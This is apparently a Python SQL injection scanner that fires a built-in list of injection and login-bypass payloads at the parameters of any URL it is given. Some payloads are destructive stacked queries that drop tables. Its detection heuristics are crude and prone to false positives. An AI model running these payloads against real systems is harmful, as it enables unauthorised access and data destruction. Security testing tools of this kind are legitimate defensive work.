"""SQL Injection vulnerability testing"""

import re
from typing import Dict, Any, List, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import requests


class SQLInjectionTester:
    """SQL Injection vulnerability scanner"""

    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.payloads = self._load_payloads()

    def _load_payloads(self) -> List[str]:
        """Load SQL injection test payloads"""
        return [
            # Basic injection
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "admin'/*",
            
            # Union-based
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            
            # Boolean-based blind
            "' AND '1'='1",
            "' AND '1'='2",
            "' AND 1=1--",
            "' AND 1=2--",
            
            # Time-based blind
            "' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "; WAITFOR DELAY '0:0:5'--",
            
            # Error-based
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' AND extractvalue(1, concat(0x7e, version()))--",
            
            # Numeric injection
            "1 OR 1=1",
            "1' OR '1'='1",
            "1) OR (1=1",
            
            # Comment injection
            "admin'--",
            "admin' #",
            "admin'/*",
            
            # Stacked queries
            "'; DROP TABLE users--",
            "1; EXEC sp_MSForEachTable 'DROP TABLE ?'",
        ]

    def test_url(self, url: str, method: str = "GET", data: Dict = None) -> Dict[str, Any]:
        """
        Test URL for SQL injection vulnerabilities
        
        Args:
            url: Target URL to test
            method: HTTP method (GET or POST)
            data: POST data dictionary (if method=POST)
            
        Returns:
            Dictionary with test results
        """
        vulnerabilities = []
        
        # Test URL parameters
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        if params:
            for param_name in params.keys():
                results = self._test_parameter(url, param_name, method, "GET")
                if results:
                    vulnerabilities.extend(results)
        
        # Test POST parameters if data provided
        if method == "POST" and data:
            for param_name in data.keys():
                results = self._test_parameter(url, param_name, method, "POST", data)
                if results:
                    vulnerabilities.extend(results)
        
        return {
            "url": url,
            "method": method,
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "total_vulnerabilities": len(vulnerabilities),
        }

    def _test_parameter(
        self,
        url: str,
        param_name: str,
        method: str,
        param_type: str,
        post_data: Dict = None
    ) -> List[Dict[str, Any]]:
        """Test a specific parameter for SQL injection"""
        vulnerabilities = []
        
        # Get baseline response
        try:
            if method == "GET":
                baseline_response = requests.get(url, timeout=self.timeout)
            else:
                baseline_response = requests.post(url, data=post_data, timeout=self.timeout)
            
            baseline_length = len(baseline_response.text)
            baseline_status = baseline_response.status_code
            
        except Exception as e:
            return []
        
        # Test each payload
        for payload in self.payloads:
            try:
                test_url, test_data = self._inject_payload(
                    url, param_name, payload, param_type, post_data
                )
                
                if method == "GET":
                    response = requests.get(test_url, timeout=self.timeout)
                else:
                    response = requests.post(test_url, data=test_data, timeout=self.timeout)
                
                # Check for vulnerability indicators
                is_vulnerable, detection_method = self._analyze_response(
                    response,
                    baseline_length,
                    baseline_status,
                    payload
                )
                
                if is_vulnerable:
                    vulnerabilities.append({
                        "parameter": param_name,
                        "parameter_type": param_type,
                        "payload": payload,
                        "detection_method": detection_method,
                        "severity": self._determine_severity(detection_method),
                        "evidence": self._extract_evidence(response.text, payload),
                    })
                    
            except Exception as e:
                # Timeout might indicate time-based injection
                if "SLEEP" in payload or "WAITFOR" in payload:
                    vulnerabilities.append({
                        "parameter": param_name,
                        "parameter_type": param_type,
                        "payload": payload,
                        "detection_method": "time_based_blind",
                        "severity": "high",
                        "evidence": f"Request timed out (possible time-based SQLi)",
                    })
        
        return vulnerabilities

    def _inject_payload(
        self,
        url: str,
        param_name: str,
        payload: str,
        param_type: str,
        post_data: Dict = None
    ) -> Tuple[str, Dict]:
        """Inject payload into parameter"""
        if param_type == "GET":
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            params[param_name] = [payload]
            
            new_query = urlencode(params, doseq=True)
            new_url = urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                new_query,
                parsed_url.fragment
            ))
            
            return new_url, None
        else:
            # POST parameter
            test_data = post_data.copy() if post_data else {}
            test_data[param_name] = payload
            return url, test_data

    def _analyze_response(
        self,
        response,
        baseline_length: int,
        baseline_status: int,
        payload: str
    ) -> Tuple[bool, str]:
        """Analyze response for SQL injection indicators"""
        
        # Error-based detection
        sql_errors = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"MySQLSyntaxErrorException",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError:",
            r"org\.postgresql\.util\.PSQLException",
            r"ERROR.*SQLite",
            r"Warning.*SQLite3::",
            r"System\.Data\.SqlClient\.SqlException",
            r"Microsoft.*SQL Native Client error",
            r"\[SQL Server\]",
            r"ODBC SQL Server Driver",
            r"SQLServer JDBC Driver",
            r"Oracle.*error",
            r"ORA-[0-9]{5}",
        ]
        
        for pattern in sql_errors:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True, "error_based"
        
        # Boolean-based detection (significant content change)
        length_diff = abs(len(response.text) - baseline_length)
        if length_diff > 100:  # Significant change
            return True, "boolean_based"
        
        # Union-based detection
        if "UNION" in payload and response.status_code == 200:
            if len(response.text) > baseline_length * 1.5:
                return True, "union_based"
        
        return False, None

    def _determine_severity(self, detection_method: str) -> str:
        """Determine severity based on detection method"""
        severity_map = {
            "error_based": "high",
            "union_based": "critical",
            "boolean_based": "high",
            "time_based_blind": "high",
        }
        return severity_map.get(detection_method, "medium")

    def _extract_evidence(self, response_text: str, payload: str) -> str:
        """Extract evidence of SQL injection"""
        # Return first 200 chars of response containing error or interesting content
        if len(response_text) > 200:
            return response_text[:200] + "..."
        return response_text

    def test_authentication_bypass(self, login_url: str, username_field: str, password_field: str) -> Dict[str, Any]:
        """
        Test for SQL injection in authentication
        
        Args:
            login_url: Login endpoint URL
            username_field: Username field name
            password_field: Password field name
            
        Returns:
            Test results
        """
        bypass_payloads = [
            ("admin' --", "anything"),
            ("admin' #", "anything"),
            ("admin'/*", "anything"),
            ("' OR '1'='1' --", "' OR '1'='1' --"),
            ("admin", "' OR '1'='1"),
        ]
        
        vulnerabilities = []
        
        for username, password in bypass_payloads:
            try:
                data = {
                    username_field: username,
                    password_field: password
                }
                
                response = requests.post(login_url, data=data, timeout=self.timeout, allow_redirects=False)
                
                # Check if bypass was successful
                if response.status_code in [200, 302] and "error" not in response.text.lower():
                    vulnerabilities.append({
                        "type": "authentication_bypass",
                        "username_payload": username,
                        "password_payload": password,
                        "severity": "critical",
                        "evidence": f"Status: {response.status_code}, possible successful bypass",
                    })
                    
            except Exception as e:
                pass
        
        return {
            "url": login_url,
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
        }
